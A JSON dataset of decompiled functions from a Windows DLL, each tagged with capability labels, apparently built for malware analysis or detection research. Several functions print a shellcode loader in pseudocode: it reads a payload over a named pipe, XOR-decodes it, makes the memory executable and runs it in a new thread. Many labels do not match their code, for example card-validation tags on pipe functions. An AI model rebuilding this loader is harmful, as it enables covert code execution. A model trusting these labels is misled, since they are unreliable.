{
    "6bac1050": {
        "rules": [
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong fcn.6bac1050(ulong arg1, ulong arg2, ulong arg3)\n\n{\n    uint64_t uVar1;\n    code *pcVar2;\n    int64_t iVar3;\n    uint64_t uVar4;\n    ulong uVar5;\n    code **ppcVar6;\n    code **ppcVar7;\n    int64_t in_GS_OFFSET;\n    bool bVar8;\n    \n    pcVar2 = _sym.imp.KERNEL32.dll_Sleep;\n    if (arg2 == 0) {\n        uVar5 = 0;\n        if (0 < *0x6bac7000) {\n            *0x6bac7000 = *0x6bac7000 + -1;\n            LOCK();\n            bVar8 = *0x6bac7960 == 0;\n            *0x6bac7960 = *0x6bac7960 ^ bVar8 * (*0x6bac7960 ^ 1);\n            iVar3 = !bVar8 * *0x6bac7960;\n            while (iVar3 != 0) {\n                (*pcVar2)(1000);\n                LOCK();\n                bVar8 = *0x6bac7960 == 0;\n                *0x6bac7960 = *0x6bac7960 ^ bVar8 * (*0x6bac7960 ^ 1);\n                iVar3 = !bVar8 * *0x6bac7960;\n            }\n            if (*0x6bac7958 == 2) {\n                ppcVar6 = fcn.6bac1990(*0x6bac7948);\n                if (ppcVar6 != NULL) {\n                    ppcVar7 = fcn.6bac1990(*0x6bac7950);\n                    while (ppcVar7 = ppcVar7 + -1,  ppcVar6 <= ppcVar7) {\n                        while (pcVar2 = *ppcVar7,  pcVar2 != NULL) {\n                            ppcVar7 = ppcVar7 + -1;\n                            (*pcVar2)();\n                            if (ppcVar7 < ppcVar6) goto code_r0x6bac120f;\n                        }\n                    }\ncode_r0x6bac120f:\n                    sub.msvcrt.dll_free(ppcVar6);\n                    *0x6bac7950 = 0;\n                    *0x6bac7948 = 0;\n                }\n                LOCK();\n                *0x6bac7958 = 0;\n                *0x6bac7960 = 0;\n                return 1;\n            }\n            sub.msvcrt.dll__amsg_exit(0x1f);\n            uVar5 = 1;\n        }\n    }\n    else {\n        uVar5 = 1;\n        if (arg2 == 1) {\n            uVar1 = *(*(in_GS_OFFSET + 0x30) + 8);\n            LOCK();\n            bVar8 = *0x6bac7960 == 0;\n            *0x6bac7960 = *0x6bac7960 ^ bVar8 * (*0x6bac7960 ^ uVar1);\n            uVar4 = !bVar8 * *0x6bac7960;\n            bVar8 = false;\n            if ((uVar4 != 0) && (bVar8 = true,  uVar1 != uVar4)) {\n                do {\n                    (*pcVar2)(1000);\n                    LOCK();\n                    bVar8 = *0x6bac7960 == 0;\n                    *0x6bac7960 = *0x6bac7960 ^ bVar8 * (*0x6bac7960 ^ uVar1);\n                    uVar4 = !bVar8 * *0x6bac7960;\n                    if (uVar4 == 0) {\n                        bVar8 = false;\n                        goto code_r0x6bac1143;\n                    }\n                } while (uVar1 != uVar4);\n                bVar8 = true;\n            }\ncode_r0x6bac1143:\n            if (*0x6bac7958 == 1) {\n                sub.msvcrt.dll__amsg_exit(0x1f);\n            }\n            else if (*0x6bac7958 == 0) {\n                *0x6bac7958 = 1;\n                sub.msvcrt.dll__initterm(0x6baca010, 0x6baca020);\n            }\n            if (*0x6bac7958 == 1) {\n                sub.msvcrt.dll__initterm(0x6baca000, 0x6baca008);\n                *0x6bac7958 = 2;\n            }\n            if (!bVar8) {\n                LOCK();\n                *0x6bac7960 = 0;\n            }\n            if (*0x6bac3410 != NULL) {\n                (**0x6bac3410)(arg1, 2, arg3);\n            }\n            *0x6bac7000 = *0x6bac7000 + 1;\n            return 1;\n        }\n    }\n    return uVar5;\n}\n",
        "token_count": 1110
    },
    "null": {
        "rules": [
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "",
        "token_count": 0
    },
    "6bac1733": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.6bac1733(int64_t arg1)\n\n{\n    if ((0 < *0x6bac300c) && (0 < *0x6bac3010)) {\n        *(arg1 + *0x6bac300c) = _sym.imp.KERNEL32.dll_GetModuleHandleA;\n        *(arg1 + *0x6bac3010) = _sym.imp.KERNEL32.dll_GetProcAddress;\n    }\n    return;\n}\n",
        "token_count": 98
    },
    "6bac2020": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t fcn.6bac2020(void)\n\n{\n    uint64_t uVar1;\n    int64_t iVar2;\n    uint32_t uVar3;\n    uint64_t uVar4;\n    \n    if (*0x6bac7050 != 0) {\n        return *0x6bac7050;\n    }\n    *0x6bac7050 = 1;\n    uVar4 = *0x6bac2ef0 & 0xffffffff;\n    if (*0x6bac2ef0 == -1) {\n        uVar1 = 0;\n        do {\n            uVar4 = uVar1;\n            uVar3 = uVar4 + 1;\n            uVar1 = uVar3;\n        } while (*(uVar3 * 8 + 0x6bac2ef0) != 0);\n    }\n    uVar3 = uVar4;\n    while (uVar3 != 0) {\n        (**(uVar4 * 8 + 0x6bac2ef0))();\n        uVar3 = uVar4 - 1;\n        uVar4 = uVar3;\n    }\n    iVar2 = fcn.6bac1810(0x6bac1f80);\n    return -(iVar2 == 0);\n}\n",
        "token_count": 277
    },
    "6bac1c70": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x6bac1ced)\n// WARNING: Removing unreachable block (ram,0x6bac1cf7)\n// WARNING: Removing unreachable block (ram,0x6bac1d01)\n// WARNING: Removing unreachable block (ram,0x6bac1dc8)\n// WARNING: Removing unreachable block (ram,0x6bac1dd4)\n// WARNING: Removing unreachable block (ram,0x6bac1de0)\n// WARNING: Removing unreachable block (ram,0x6bac1dec)\n// WARNING: Removing unreachable block (ram,0x6bac1df9)\n// WARNING: Removing unreachable block (ram,0x6bac1e05)\n// WARNING: Removing unreachable block (ram,0x6bac1e12)\n// WARNING: Removing unreachable block (ram,0x6bac1e23)\n// WARNING: Removing unreachable block (ram,0x6bac1e96)\n// WARNING: Removing unreachable block (ram,0x6bac1ea3)\n// WARNING: Removing unreachable block (ram,0x6bac1e3e)\n// WARNING: Removing unreachable block (ram,0x6bac1e40)\n// WARNING: Removing unreachable block (ram,0x6bac1f19)\n// WARNING: Removing unreachable block (ram,0x6bac1f23)\n// WARNING: Removing unreachable block (ram,0x6bac1e49)\n// WARNING: Removing unreachable block (ram,0x6bac1e61)\n// WARNING: Removing unreachable block (ram,0x6bac1eec)\n// WARNING: Removing unreachable block (ram,0x6bac1ec5)\n// WARNING: Removing unreachable block (ram,0x6bac1ed4)\n// WARNING: Removing unreachable block (ram,0x6bac1f36)\n// WARNING: Removing unreachable block (ram,0x6bac1f3b)\n// WARNING: Removing unreachable block (ram,0x6bac1f44)\n// WARNING: Removing unreachable block (ram,0x6bac1ed6)\n// WARNING: Removing unreachable block (ram,0x6bac1edb)\n// WARNING: Removing unreachable block (ram,0x6bac1eb4)\n// WARNING: Removing unreachable block (ram,0x6bac1ef8)\n// WARNING: Removing unreachable block (ram,0x6bac1f05)\n// WARNING: Removing unreachable block (ram,0x6bac1e6a)\n// WARNING: Removing unreachable block (ram,0x6bac1e6f)\n// WARNING: Removing unreachable block (ram,0x6bac1e79)\n// WARNING: Removing unreachable block (ram,0x6bac1e88)\n// WARNING: Removing unreachable block (ram,0x6bac1e91)\n// WARNING: Removing unreachable block (ram,0x6bac1d11)\n// WARNING: Removing unreachable block (ram,0x6bac1d1a)\n// WARNING: Removing unreachable block (ram,0x6bac1d21)\n// WARNING: Removing unreachable block (ram,0x6bac1d46)\n// WARNING: Removing unreachable block (ram,0x6bac1d54)\n// WARNING: Removing unreachable block (ram,0x6bac1d83)\n// WARNING: Removing unreachable block (ram,0x6bac1d93)\n// WARNING: Removing unreachable block (ram,0x6bac1f49)\n// WARNING: Removing unreachable block (ram,0x6bac1f67)\n// WARNING: Removing unreachable block (ram,0x6bac1f93)\n// WARNING: Removing unreachable block (ram,0x6bac1fb0)\n// WARNING: Removing unreachable block (ram,0x6bac1dad)\n// WARNING: Removing unreachable block (ram,0x6bac1d70)\n// WARNING: Variable defined which should be unmapped: var_bp_20h\n\nvoid fcn.6bac1c70(ulong param_1)\n\n{\n    int64_t iVar1;\n    uchar auStack104 [24];\n    ulong var_48h;\n    ulong var_30h;\n    ulong var_bp_20h;\n    \n    if (*0x6bac7030 == 0) {\n        *0x6bac7030 = 1;\n        fcn.6bac2a60();\n        iVar1 = fcn.6bac2d00(param_1);\n        *0x6bac7040 = 0;\n        *0x6bac7038 = auStack104 + -iVar1;\n    }\n    return;\n}\n",
        "token_count": 975
    },
    "6bac2860": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nulong fcn.6bac2860(ulong noname_0, ulong arg2)\n\n{\n    if (arg2 != 1) {\n        if (arg2 == 0) {\n            if (*0x6bac7880 != 0) {\n                fcn.6bac26d0();\n            }\n            if (*0x6bac7880 == 1) {\n                *0x6bac7880 = 0;\n                (*_sym.imp.KERNEL32.dll_DeleteCriticalSection)(0x6bac78a0);\n            }\n        }\n        else if ((arg2 == 3) && (*0x6bac7880 != 0)) {\n            fcn.6bac26d0();\n        }\n        return 1;\n    }\n    if (*0x6bac7880 == 0) {\n        (*_sym.imp.KERNEL32.dll_InitializeCriticalSection)(0x6bac78a0);\n    }\n    *0x6bac7880 = 1;\n    return 1;\n}\n",
        "token_count": 214
    },
    "6bac1810": {
        "rules": [
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353"
        ],
        "decompiled_code": "\nulong fcn.6bac1810(ulong arg1)\n\n{\n    ulong uVar1;\n    int64_t iStack24;\n    ulong uStack16;\n    \n    iStack24 = fcn.6bac1990(*0x6bac7948);\n    if (iStack24 != -1) {\n        sub.msvcrt.dll__lock(8);\n        iStack24 = fcn.6bac1990(*0x6bac7948);\n        uStack16 = fcn.6bac1990(*0x6bac7950);\n        uVar1 = sub.msvcrt.dll___dllonexit(arg1, &iStack24, &uStack16);\n        *0x6bac7948 = fcn.6bac19a0(iStack24);\n        *0x6bac7950 = fcn.6bac19a0(uStack16);\n        sub.msvcrt.dll__unlock(8);\n        return uVar1;\n    }\n    uVar1 = (*_sym.imp.msvcrt.dll__onexit)(arg1);\n    return uVar1;\n}\n",
        "token_count": 233
    },
    "6bac1440": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.6bac1440(int64_t arg1, ulong arg2)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int64_t iVar3;\n    uint64_t in_stack_ffffffffffffffa8;\n    uint32_t auStack44 [3];\n    \n    auStack44[0] = 0;\n    iVar3 = (*_sym.imp.KERNEL32.dll_CreateNamedPipeA)\n                      (0x6bac7900, 2, 0, 1, in_stack_ffffffffffffffa8 & 0xffffffff00000000, 0, 0, 0);\n    if ((iVar3 - 1U < 0xfffffffffffffffe) &&\n       (iVar2 = (*_sym.imp.KERNEL32.dll_ConnectNamedPipe)(iVar3, 0),  pcVar1 = _sym.imp.KERNEL32.dll_WriteFile, \n       iVar2 != 0)) {\n        while ((0 < arg2 && (iVar2 = (*pcVar1)(iVar3, arg1, arg2, auStack44, 0),  iVar2 != 0))) {\n            arg2._0_4_ = arg2 - auStack44[0];\n            arg1 = arg1 + auStack44[0];\n        }\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar3);\n    }\n    return;\n}\n",
        "token_count": 294
    },
    "6bac1512": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.6bac1512(int64_t arg1, ulong arg2)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int64_t iVar3;\n    ulong uVar4;\n    uint32_t auStack44 [3];\n    \n    auStack44[0] = 0;\n    iVar3 = (*_sym.imp.KERNEL32.dll_CreateFileA)(0x6bac7900, 0x80000000, 3, 0, 3, 0x80, 0);\n    pcVar1 = _sym.imp.KERNEL32.dll_ReadFile;\n    uVar4 = 0;\n    if (iVar3 != -1) {\n        while ((0 < arg2 && (iVar2 = (*pcVar1)(iVar3, arg1, arg2, auStack44, 0),  iVar2 != 0))) {\n            arg2._0_4_ = arg2 - auStack44[0];\n            arg1 = arg1 + auStack44[0];\n        }\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar3);\n        uVar4 = 1;\n    }\n    return uVar4;\n}\n",
        "token_count": 255
    },
    "6bac1605": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.6bac1605(void)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    ulong arg1;\n    uint64_t uVar3;\n    uint uVar4;\n    ulong in_stack_ffffffffffffffc0;\n    uint32_t uVar5;\n    ulong in_stack_fffffffffffffff0;\n    \n    uVar5 = in_stack_fffffffffffffff0 >> 0x20;\n    uVar4 = in_stack_ffffffffffffffc0 >> 0x20;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetTickCount)();\n    sub.msvcrt.dll_sprintf\n              (0x6bac7900, \"%c%c%c%c%c%c%c%c%cMSSE-%d-server\", 0x5c, 0x5c, 0x2e, CONCAT44(uVar4, 0x5c), 0x70, 0x69, 0x70\n               , 0x65, 0x5c, (uVar3 & 0xffffffff) % 0x26aa | uVar5 << 0x20);\n    (*_sym.imp.KERNEL32.dll_CreateThread)(0, 0, 0x6bac14f5, 0, 0, 0);\n    arg1 = sub.msvcrt.dll_malloc(*0x6bac3004);\n    pcVar1 = _sym.imp.KERNEL32.dll_Sleep;\n    do {\n        (*pcVar1)(0x400);\n        iVar2 = fcn.6bac1512(arg1, *0x6bac3004);\n    } while (iVar2 == 0);\n    fcn.6bac176e(arg1, *0x6bac3004, 0x6bac3008);\n    return 0;\n}\n",
        "token_count": 387
    },
    "6bac176e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "create thread",
            "allocate memory"
        ],
        "decompiled_code": "\nvoid fcn.6bac176e(int64_t arg1, ulong dwSize, int64_t arg3)\n\n{\n    int64_t arg1_00;\n    int64_t iVar1;\n    uchar auStack44 [4];\n    \n    arg1_00 = (*_sym.imp.KERNEL32.dll_VirtualAlloc)(0, dwSize, 0x3000, 4);\n    for (iVar1 = 0; iVar1 < dwSize; iVar1 = iVar1 + 1) {\n        *(arg1_00 + iVar1) = *(arg3 + (iVar1 & 3)) ^ *(arg1 + iVar1);\n    }\n    fcn.6bac1733(arg1_00);\n    (*_sym.imp.KERNEL32.dll_VirtualProtect)(arg1_00, dwSize, 0x20, auStack44);\n    (*_sym.imp.KERNEL32.dll_CreateThread)(0, 0, 0x6bac1730, arg1_00, 0, 0);\n    return;\n}\n",
        "token_count": 223
    },
    "6bac1a20": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Possible PIC construction at 0x6bac1bdf: Changing call to branch\n// WARNING: Removing unreachable block (ram,0x6bac1be4)\n// WARNING: Removing unreachable block (ram,0x6bac1bf1)\n// WARNING: Removing unreachable block (ram,0x6bac1bfa)\n// WARNING: Removing unreachable block (ram,0x6bac1ced)\n// WARNING: Removing unreachable block (ram,0x6bac1cf7)\n// WARNING: Removing unreachable block (ram,0x6bac1d01)\n// WARNING: Removing unreachable block (ram,0x6bac1dc8)\n// WARNING: Removing unreachable block (ram,0x6bac1dd4)\n// WARNING: Removing unreachable block (ram,0x6bac1de0)\n// WARNING: Removing unreachable block (ram,0x6bac1dec)\n// WARNING: Removing unreachable block (ram,0x6bac1df9)\n// WARNING: Removing unreachable block (ram,0x6bac1e05)\n// WARNING: Removing unreachable block (ram,0x6bac1e12)\n// WARNING: Removing unreachable block (ram,0x6bac1e23)\n// WARNING: Removing unreachable block (ram,0x6bac1e96)\n// WARNING: Removing unreachable block (ram,0x6bac1ea3)\n// WARNING: Removing unreachable block (ram,0x6bac1e3e)\n// WARNING: Removing unreachable block (ram,0x6bac1e40)\n// WARNING: Removing unreachable block (ram,0x6bac1f19)\n// WARNING: Removing unreachable block (ram,0x6bac1f23)\n// WARNING: Removing unreachable block (ram,0x6bac1e49)\n// WARNING: Removing unreachable block (ram,0x6bac1e61)\n// WARNING: Removing unreachable block (ram,0x6bac1eec)\n// WARNING: Removing unreachable block (ram,0x6bac1ec5)\n// WARNING: Removing unreachable block (ram,0x6bac1ed4)\n// WARNING: Removing unreachable block (ram,0x6bac1f36)\n// WARNING: Removing unreachable block (ram,0x6bac1f3b)\n// WARNING: Removing unreachable block (ram,0x6bac1f44)\n// WARNING: Removing unreachable block (ram,0x6bac1ed6)\n// WARNING: Removing unreachable block (ram,0x6bac1edb)\n// WARNING: Removing unreachable block (ram,0x6bac1eb4)\n// WARNING: Removing unreachable block (ram,0x6bac1ef8)\n// WARNING: Removing unreachable block (ram,0x6bac1f05)\n// WARNING: Removing unreachable block (ram,0x6bac1e6a)\n// WARNING: Removing unreachable block (ram,0x6bac1e6f)\n// WARNING: Removing unreachable block (ram,0x6bac1e79)\n// WARNING: Removing unreachable block (ram,0x6bac1e88)\n// WARNING: Removing unreachable block (ram,0x6bac1e91)\n// WARNING: Removing unreachable block (ram,0x6bac1d11)\n// WARNING: Removing unreachable block (ram,0x6bac1d1a)\n// WARNING: Removing unreachable block (ram,0x6bac1d21)\n// WARNING: Removing unreachable block (ram,0x6bac1d46)\n// WARNING: Removing unreachable block (ram,0x6bac1d54)\n// WARNING: Removing unreachable block (ram,0x6bac1d83)\n// WARNING: Removing unreachable block (ram,0x6bac1d93)\n// WARNING: Removing unreachable block (ram,0x6bac1f49)\n// WARNING: Removing unreachable block (ram,0x6bac1f67)\n// WARNING: Removing unreachable block (ram,0x6bac1f93)\n// WARNING: Removing unreachable block (ram,0x6bac1fb0)\n// WARNING: Removing unreachable block (ram,0x6bac1dad)\n// WARNING: Removing unreachable block (ram,0x6bac1d70)\n\nvoid fcn.6bac1a20(uint64_t arg1, ulong arg2, uint64_t arg3)\n\n{\n    int32_t iVar1;\n    uchar *puVar2;\n    int64_t iVar3;\n    char *arg1_00;\n    uint32_t uVar4;\n    code *pcVar5;\n    uint *puVar6;\n    code *pcVar7;\n    uint64_t uVar8;\n    ulong arg3_00;\n    uchar *in_R9;\n    int64_t unaff_R12;\n    int64_t unaff_R13;\n    uchar auStack304 [64];\n    uint64_t uStack240;\n    uint64_t uStack232;\n    ulong uStack224;\n    int64_t iStack216;\n    code *pcStack208;\n    ulong uStack168;\n    ulong uStack144;\n    int32_t iStack132;\n    ulong uStack120;\n    int32_t iStack84;\n    uchar auStack60 [12];\n    \n    if (arg3 == 0) {\n        return;\n    }\n    uVar8 = arg3;\n    if (*0x6bac7040 < 1) {\n        pcVar5 = NULL;\n    }\n    else {\n        pcVar5 = NULL;\n        puVar2 = *0x6bac7038;\n        do {\n            if ((*(puVar2 + 8) <= arg1) &&\n               (uVar8 = *(*(puVar2 + 0x10) + 8),  pcVar7 = _sym.imp.KERNEL32.dll_VirtualQuery, \n               arg1 < *(puVar2 + 8) + uVar8)) goto code_r0x6bac1b17;\n            uVar4 = pcVar5 + 1;\n            pcVar5 = uVar4;\n            puVar2 = puVar2 + 0x18;\n        } while (uVar4 != *0x6bac7040);\n    }\n    pcStack208 = 0x6bac1aa0;\n    unaff_R12 = fcn.6bac2a20(arg1);\n    if (unaff_R12 == 0) {\n        pcStack208 = 0x6bac1c3d;\n        fcn.6bac19b0(\"Address %p has no image-section\", arg1, uVar8, in_R9);\n    }\n    else {\n        unaff_R13 = pcVar5 * 0x18;\n        puVar6 = *0x6bac7038 + unaff_R13;\n        *(puVar6 + 4) = unaff_R12;\n        *puVar6 = 0;\n        pcStack208 = 0x6bac1ad2;\n        iVar3 = fcn.6bac2b10();\n        *(puVar6 + 2) = iVar3 + *(unaff_R12 + 0xc);\n        pcVar5 = _sym.imp.KERNEL32.dll_VirtualQuery;\n        pcStack208 = 0x6bac1afe;\n        iVar3 = (*_sym.imp.KERNEL32.dll_VirtualQuery)(*(*0x6bac7038 + unaff_R13 + 8), &stack0xffffffffffffff88, 0x30);\n        if (iVar3 != 0) {\n            if ((iStack84 == 4) || (iStack84 == 0x40)) {\ncode_r0x6bac1b10:\n                *0x6bac7040 = *0x6bac7040 + 1;\n                pcVar7 = pcVar5;\n            }\n            else {\n                arg3_00 = 0x40;\n                in_R9 = *0x6bac7038 + unaff_R13;\n                pcStack208 = 0x6bac1b85;\n                iVar1 = (*_sym.imp.KERNEL32.dll_VirtualProtect)(uStack120);\n                if (iVar1 != 0) goto code_r0x6bac1b10;\n                pcStack208 = 0x6bac1b8f;\n                uVar4 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                pcStack208 = 0x6bac1b9d;\n                fcn.6bac19b0(\"  VirtualProtect failed with code 0x%x\", uVar4, arg3_00, in_R9);\n                pcVar7 = _sym.imp.KERNEL32.dll_VirtualQuery;\n            }\ncode_r0x6bac1b17:\n            pcStack208 = 0x6bac1b27;\n            iVar3 = (*pcVar7)(arg1, &stack0xffffffffffffff58, 0x30);\n            pcVar5 = pcVar7;\n            if (iVar3 != 0) {\n                if ((iStack132 != 4) && (iStack132 != 0x40)) {\n                    pcStack208 = 0x6bac1bd6;\n                    (*_sym.imp.KERNEL32.dll_VirtualProtect)(uStack168, uStack144, 0x40, &stack0xffffffffffffffc4);\n                    pcStack208 = 0x6bac1be4;\n                }\n    // WARNING: Could not recover jumptable at 0x6bac2db8. Too many branches\n    // WARNING: Treating indirect jump as call\n                (*_sym.imp.msvcrt.dll_memcpy)(arg1, arg2, arg3);\n                return;\n            }\n            goto code_r0x6bac1c5a;\n        }\n    }\n    pcStack208 = 0x6bac1c5a;\n    fcn.6bac19b0(\"  VirtualQuery failed for %d bytes at address %p\", *(unaff_R12 + 8), *(*0x6bac7038 + unaff_R13 + 8), \n                 in_R9);\ncode_r0x6bac1c5a:\n    arg1_00 = \"  VirtualQuery failed for %d bytes at address %p\";\n    pcStack208 = 0x6bac1c6e;\n    fcn.6bac19b0(\"  VirtualQuery failed for %d bytes at address %p\", 0x30, arg1, in_R9);\n    if (*0x6bac7030 == 0) {\n        *0x6bac7030 = 1;\n        uStack240 = arg1;\n        uStack232 = arg3;\n        uStack224 = arg2;\n        iStack216 = unaff_R12;\n        pcStack208 = pcVar5;\n        fcn.6bac2a60();\n        iVar3 = fcn.6bac2d00(arg1_00);\n        *0x6bac7040 = 0;\n        *0x6bac7038 = &stack0xfffffffffffffed0 + -iVar3;\n    }\n    return;\n}\n",
        "token_count": 2352
    },
    "6bac2040": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.6bac2040(void)\n\n{\n    uint64_t uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint64_t auStack72 [2];\n    uint64_t auStack56 [2];\n    \n    auStack72[0] = 0;\n    if (*0x6bac3450 != 0x2b992ddfa232) {\n        *0x6bac3460 = ~*0x6bac3450;\n        return;\n    }\n    (*_sym.imp.KERNEL32.dll_GetSystemTimeAsFileTime)(auStack72);\n    uVar1 = auStack72[0];\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetCurrentProcessId)();\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetCurrentThreadId)();\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetTickCount)();\n    (*_sym.imp.KERNEL32.dll_QueryPerformanceCounter)(auStack56);\n    *0x6bac3450 = (uVar1 ^ auStack56[0] ^ uVar2 ^ uVar3 ^ uVar4) & 0xffffffffffff;\n    *0x6bac3460 = ~*0x6bac3450;\n    if (*0x6bac3450 == 0x2b992ddfa232) {\n        *0x6bac3460 = 0xffffd466d2205dcc;\n        *0x6bac3450 = 0x2b992ddfa233;\n    }\n    return;\n}\n",
        "token_count": 341
    },
    "6bac23b0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.6bac23b0(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int64_t iVar4;\n    int64_t iVar5;\n    int32_t *piVar6;\n    ulong *puVar7;\n    uint64_t uVar8;\n    \n    iVar4 = fcn.6bac2b10();\n    iVar3 = *0x6bac75e8;\n    if ((iVar4 != 0) && (*0x6bac75e8 == 0)) {\n        *0x6bac75e8 = 1;\n        iVar5 = fcn.6bac2980(\".pdata\");\n        iVar3 = 1;\n        if (iVar5 == 0) {\n            piVar6 = 0x6bac7600;\n            puVar7 = 0x6bac7600;\n            for (iVar5 = 0x30; iVar5 != 0; iVar5 = iVar5 + -1) {\n                *puVar7 = 0;\n                puVar7 = puVar7 + 1;\n            }\n            puVar7 = 0x6bac7780;\n            for (iVar5 = 0x20; iVar5 != 0; iVar5 = iVar5 + -1) {\n                *puVar7 = 0;\n                puVar7 = puVar7 + 1;\n            }\n            uVar8 = 0;\n            do {\n                iVar5 = fcn.6bac2a90(uVar8);\n                if (iVar5 == 0) {\n                    if (uVar8 == 0) {\n                        return 1;\n                    }\n                    uVar8 = uVar8 & 0xffffffff;\n                    goto code_r0x6bac2495;\n                }\n                *(uVar8 * 8 + 0x6bac7780) = 9;\n                *(uVar8 * 8 + 0x6bac7784) = 0x6bac2210 - iVar4;\n                iVar3 = *(iVar5 + 0xc);\n                *piVar6 = iVar3;\n                iVar1 = *(iVar5 + 8);\n                iVar2 = uVar8;\n                uVar8 = uVar8 + 1;\n                piVar6[2] = (iVar2 * 8 + 0x6bac7780) - iVar4;\n                piVar6[1] = iVar3 + iVar1;\n                piVar6 = piVar6 + 3;\n            } while (uVar8 != 0x20);\n            uVar8 = 0x20;\ncode_r0x6bac2495:\n            (*_sym.imp.KERNEL32.dll_RtlAddFunctionTable)(0x6bac7600, uVar8, iVar4);\n            iVar3 = 1;\n        }\n    }\n    return iVar3;\n}\n",
        "token_count": 621
    },
    "6bac26d0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.6bac26d0(void)\n\n{\n    uint *puVar1;\n    code *pcVar2;\n    code *pcVar3;\n    int32_t iVar4;\n    int64_t iVar5;\n    \n    (*_sym.imp.KERNEL32.dll_EnterCriticalSection)(0x6bac78a0);\n    pcVar3 = _sym.imp.KERNEL32.dll_TlsGetValue;\n    pcVar2 = _sym.imp.KERNEL32.dll_GetLastError;\n    for (puVar1 = *0x6bac78c8; puVar1 != NULL; puVar1 = *(puVar1 + 4)) {\n        iVar5 = (*pcVar3)(*puVar1);\n        iVar4 = (*pcVar2)();\n        if ((iVar4 == 0) && (iVar5 != 0)) {\n            (**(puVar1 + 2))();\n        }\n    }\n    // WARNING: Could not recover jumptable at 0x6bac273a. Too many branches\n    // WARNING: Treating indirect jump as call\n    (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(0x6bac78a0);\n    return;\n}\n",
        "token_count": 249
    },
    "6bac2900": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nbool fcn.6bac2900(int16_t *arg1)\n\n{\n    if ((*arg1 == 0x5a4d) && (*(arg1 + *(arg1 + 0x1e)) == 0x4550)) {\n        return *(arg1 + *(arg1 + 0x1e) + 6) == 0x20b;\n    }\n    return false;\n}\n",
        "token_count": 88
    },
    "6bac2930": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff",
            "contain loop"
        ],
